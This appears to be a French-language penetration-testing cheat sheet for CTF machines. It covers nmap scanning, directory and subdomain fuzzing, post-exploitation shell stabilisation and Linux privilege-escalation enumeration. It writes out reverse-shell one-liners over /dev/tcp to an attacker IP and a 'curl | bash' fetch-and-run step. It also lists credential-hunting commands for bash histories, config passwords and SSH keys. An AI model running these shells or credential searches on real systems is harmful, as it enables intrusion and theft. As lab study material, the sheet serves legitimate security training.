```
IP CIBLE : 10.10.10.10
```


## Reconnaissance
```bash 
ping -c2 <IP>
echo '<IP>\n' > cible; mkdir nmap
```

```bash 
# scan tcp sur les ports et versions 
sudo nmap -Pn -p- --min-rate 10000 -sV -iL cible -oA ./nmap/version-<NAME>
# scan tcp avec script sur les ports trouvé Linux
sudo nmap -Pn -p22,80-sVC -iL cible -oA ./nmap/script-<NAME>
# scan tcp avec script sur les ports trouvé pour Windows
sudo nmap -Pn -p53,88,135,139,389,445,464,3268,5985 -sVC -iL cible -oA ./nmap/script-<NAME>
# scan udp --top-ports 100
sudo nmap -sU --top-port 100 -iL cible -oA ./nmap/udp-<NAME>
```




```bash 
sudo nano /etc/hosts
10.129.234.71    baby.vl dc.baby.vl


sudo sh -c  'echo "<IP>     greenhorn.htb" >> /etc/hosts'
```

```bash 
sudo ntpdate dc.baby.vl
2026-08-04 03:14:10.600900 (-0400) +2.599165 +/- 0.010673 dc.baby.vl 10.129.234.71 s1 no-leap
CLOCK: time stepped by 2.599165
```



## Enumération

## Exploitation

## Privesc

```bash 
curl -I http://IP:port
```

```
sudo sh -c  'echo "10.10.10.10     greenhorn.htb" >> /etc/hosts'
```

Test des extensions de fichier

https://www.hackingarticles.in/a-detailed-guide-on-wfuzz/

DIRECTORY-LISTING 
```
/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt


feroxbuster -u http://name.htb
gobuster dir -u http://name.htb/ -w  /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -f
gobuster dir -u http://name.htb/ -w  /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -e php, html,txt -b 302 -f 
gobuster dir -u http://10.10.10.85:3000/ -w  /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt 

# recherche des types fichier extension 
ffuf -u http://facts.htb/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 302
```


DNS - SOUS DOMAINE 
```bash 
# A bien fonctionner dernièrement
gobuster dns --domain planning.htb -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt --no-error
wfuzz -u http://10.129.237.241 -H "Host: FUZZ.planning.htb" -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt --hc 301
ffuf -u http://10.129.237.241 -H "Host: FUZZ.planning.htb" -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -ac
gobuster vhost -u silentium.htb -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt  --append-domain




# Technique possible
gobuster dns -d metapress.htb -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt
gobuster vhost -u alert.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt
gobuster vhost -u silentium.htb -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt  --append-domain
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt:FUZZ -u http://FUZZ.metapress.htb/ 

# WFUZZ
## Filtre --hc {code status}
wfuzz -u http://10.10.11.186 -H "Host: FUZZ.metapress.htb" -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
wfuzz -u http://10.10.11.44 -H "Host: FUZZ.alert.htb" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt
wfuzz -u http://10.10.11.44 -H "Host: FUZZ.alert.htb" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt --hc 302
wfuzz -H "Host: FUZZ.nunchucks.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --hh 30587 https://nunchucks.htb
```









Rerverse Shell 
https://www.revshells.com/
https://github.com/pentestmonkey/
https://github.com/pentestmonkey/php-reverse-shell

# Shell interactif 
```

bash -c 'bash -i <& /dev/tcp/{IP_attquant}/{Port} &<&1' 
echo 'bash -i > /dev/tcp/{IP_CIBLE}/Port_nc 0>&1' > index.html
sudo python3 -m http.server 80
nc -lvnp 1234
curl {IP_CIBLE}|bash



python3 -c "import pty;pty.spawn('/bin/bash');"
python -c "import pty;pty.spawn('/bin/bash');"

script /dev/null -c bash 

CTRL+Z
stty raw -echo;fg
export  TERM=xterm-256color
```









ref https://delinea.com/blog/linux-privilege-escalation
ref : https://gtfobins.github.io/ 
LinEnum : https://github.com/rebootuser/LinEnum
LinPeas  :  https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS
espoinne les processus pspy : https://github.com/DominicBreuker/pspy?tab=readme-ov-file

psexec : pour lister les processus


```bash 
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
```


```bash 
### VERSION DE OS 
cat /etc/os-release    # verification sur https://ubuntu.com/about/release-cycle

##### VAriable d'environememt
echo $PATH
env 


### VERSION DU KERNEL 
cat /proc/version 
uname -a 


#### LE MATERIEL 
# connaitre les types de CPU
lscpu 
# type de shell
cat /etc/shells 
# les peripheriques
lsblk
df -h
# connaitre les disques montés
cat /ets/fstab
cat /ets/fstab | grep -v "#" | column -t


###### ENVIRONEMENT RESEAU
hostname
ip a 
route 
netstat -rn
netstat -laputen 
ss -tnl # pour avoir les ports en écoute sur la machine 
cat /etc/resolv.conf 
arp -a 
cat /etc/hosts

##  SERVICE 
ps aux 
ps aux | grep root
ps au



# USERS / GROUP
whoami 
id 
cat /etc/passwd
cat /etc/passwd | cut -f1 -d:
grep "sh$" /etc/passwd
cat /etc/group
getent group sudo

# les priviléges avec sudo 
sudo -v 
sudo -l
sudo -u lab_adm ncdu # exemple 

#connaitre qui s'est logué sur la machine
lastlog 
w



# RECONNAISSANCE GLOBALE
ls /home
## Pour chaque home
cat /home/{USER}/.bash_history
history
find / -type f \( -name *_hist -o -name *_history \) -exec ls -l {} \; 2>/dev/null


#Recherche dans le /var de l'application
ls /var

# Recherche dans le /opt les application installer manuellement
ls /opt



# Consulter les crontab /etc/crontab


## Trouver les fichiers et dossiers cachés
find / -type d -name ".*" -ls 2>/dev/null
find / -type f -name ".*" -exec ls {} \;  2>/dev/null | grep htb-student

# lister les dossier temporaires 
ls -l /tmp /var/tmp /dev/shm

# Recherche de credentials dans le fichier conf, config, bak, xml
# exemple dans le dossier /var (application)
grep 'DB_USER\|DB_PASSWORD' wp-config.php
find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null
# Chercher les clès ssh 
ls ~/.ssh
id_rsa  id_rsa.pub  known_hosts



#### PROCESSUS 
# cron tab
ls -la /etc/cron.dialy
find /proc -name cmdline -exec cat {} \; 2>/dev/null | tr " " "\n"

# list les packages 
apt list --installed | tr "/" " " | cut -d" " -f1,3 | sed 's/[0-9]://g' | tee -a installed_pkgs.list

# lister les binaires et utiliser GTFObins pour exploit (https://gtfobins.github.io/)
ls -l /bin /usr/bin/ /usr/sbin/
# script pour investiger avec exploit GTFObins
for i in $(curl -s https://gtfobins.github.io/ | html2text | cut -d" " -f1 | sed '/^[[:space:]]*$/d');do if grep -q "$i" installed_pkgs.list;then echo "Check GTFO for: $i";fi;done

# Recherche des fichiers de configurations - script 
find / -type f \( -name *.conf -o -name *.config \) -exec ls -l {} \; 2>/dev/null
find / -type f -name "*.sh" 2>/dev/null | grep -v "src\|snap\|share"

#Special Permissions
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null


# capacities droits 
find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;

```



